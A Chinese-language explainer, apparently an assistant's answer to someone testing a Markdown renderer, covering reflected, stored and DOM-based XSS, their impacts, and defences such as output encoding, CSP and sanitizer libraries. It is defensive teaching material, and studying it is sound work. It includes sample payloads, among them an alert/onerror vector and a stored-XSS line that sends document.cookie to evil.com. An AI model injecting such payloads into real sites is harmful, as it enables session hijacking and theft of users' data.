

## XSS（Cross-Site Scripting，跨站脚本攻击）

### 定义

XSS 是一种代码注入攻击。攻击者将恶意脚本（通常是 JavaScript）注入到受信任的网站页面中，当其他用户浏览该页面时，恶意脚本在用户浏览器中执行，从而窃取数据或执行恶意操作。

---

### 三种主要类型

#### 1. 反射型 XSS（Reflected XSS）

- 恶意脚本包含在 **URL 参数**中，服务器将其原样"反射"到响应页面
- **不持久**，需要诱骗用户点击特制链接
- 例：`https://example.com/search?q=<script>alert(1)</script>`，服务器把 `q` 的值直接拼进 HTML 返回

#### 2. 存储型 XSS（Stored XSS）

- 恶意脚本被**存入服务器数据库**（如评论、帖子、用户名）
- **持久性**，所有访问该页面的用户都会被攻击
- 危害最大，例：在论坛评论中提交 `<script>document.location='https://evil.com/?c='+document.cookie</script>`

#### 3. DOM 型 XSS（DOM-based XSS）

- 恶意脚本**不经过服务器**，完全在浏览器端通过 JavaScript 操作 DOM 触发
- 例：页面 JS 读取 `location.hash` 并直接写入 `innerHTML`，攻击者构造 `https://example.com/#<img src=x onerror=alert(1)>`

---

### 攻击能做什么

| 危害 | 说明 |
|------|------|
| **窃取 Cookie / Session** | `document.cookie` 发送到攻击者服务器，劫持用户会话 |
| **键盘记录** | 监听 `keydown` 事件，记录用户输入的密码、信用卡号 |
| **钓鱼** | 动态修改页面内容，伪造登录表单骗取凭据 |
| **传播蠕虫** | 自动代表受害者发帖/发消息，形成蠕虫式传播（如 Samy 蠕虫） |
| **挖矿 / DDoS** | 利用受害者浏览器算力挖矿或发起分布式请求 |
| **绕过同源策略** | 因为脚本在目标站点域下执行，可访问该域所有数据 |
| **操作页面** | 重定向、篡改内容、插入广告 |

---

### 攻击原理（核心）

浏览器**无法区分**"网站自身的合法脚本"和"攻击者注入的恶意脚本"。只要 HTML 中出现 `<script>` 或能触发 JS 的属性（`onerror`、`onclick`、`javascript:` 协议等），浏览器就会执行。

```
用户输入 → 未过滤/未转义 → 拼接进 HTML → 浏览器解析执行
```

---

### 常见注入点

1. **URL 参数**：`?name=<script>...`
2. **表单输入**：搜索框、评论框、注册表单
3. **HTTP 头**：Referer、User-Agent 被回显到页面
4. **富文本编辑器**：允许 HTML 的编辑器
5. **第三方数据**：API 返回的未转义内容
6. **文件名**：上传文件名被显示时
7. **Markdown 渲染器**：正是你当前测试的场景

---

### 防御措施

#### 输出编码（最核心）

在不同上下文使用不同编码规则：

| 上下文 | 编码方式 | 示例 |
|--------|---------|------|
| HTML 正文 | HTML 实体编码 | `<` → `&lt;`，`>` → `&gt;`，`"` → `&quot;` |
| HTML 属性 | HTML 属性编码 | 所有非字母数字字符编码为 `&#xHH;` |
| JavaScript | JS 编码 | `\xHH` 或 `\uHHHH` |
| URL | URL 编码 | `%HH` |
| CSS | CSS 编码 | `\HHHHHH` |

#### 输入验证

- 白名单校验（只允许预期格式，如邮箱、数字）
- 拒绝或过滤危险字符

#### CSP（Content Security Policy）

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
```
- 禁止内联脚本执行
- 限制脚本只能从指定域加载
- 即使注入成功，脚本也无法执行

#### HttpOnly Cookie

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```
- `HttpOnly`：JS 无法读取 Cookie，防止会话劫持
- `SameSite`：防止 CSRF 配合 XSS

#### 使用安全的 API

```javascript
// 危险 — 直接解析 HTML
element.innerHTML = userInput;
document.write(userInput);

// 安全 — 纯文本赋值
element.textContent = userInput;
```

#### HTML 净化库

- **DOMPurify**（前端）
- **Bleach**（Python）
- **sanitize-html**（Node.js）

在允许用户输入 HTML/Markdown 的场景（如你的测试），使用净化库过滤危险标签和属性。

---

### 与你当前测试的关系

你的 test.md 文件覆盖的正是 Markdown 渲染器场景下的 XSS 攻击面。Markdown 渲染器通常会将 Markdown 转为 HTML，如果渲染过程中未正确过滤：

- 裸 `<script>` 标签会被保留
- `javascript:` 协议链接会被渲染为可点击
- 事件属性（`onerror`、`onload`）会被浏览器执行
- SVG/MathML 等命名空间标签可能绕过简单的过滤规则

这就是为什么你的测试文件中既需要代码块展示的 payload（用于文档参考），也需要裸写的 payload（用于实际测试渲染器是否会拦截）。